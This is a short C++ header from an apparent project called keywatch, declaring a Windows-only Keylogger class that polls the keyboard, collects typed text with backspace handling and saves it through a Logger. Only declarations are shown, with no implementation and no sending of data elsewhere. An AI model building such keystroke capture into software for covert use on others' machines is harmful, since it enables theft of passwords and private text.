#pragma once

#include <string>

#include "keywatch/output/logger.hpp"

namespace keywatch::app {

// Polls the keyboard, accumulates typed text and persists it via Logger.
class Keylogger {
public:
  // Blocks forever, polling key state. (Windows-only.)
  void run();

private:
  void handle_backspace();

  std::string storage_;
  output::Logger logger_;
};

} // namespace keywatch::app
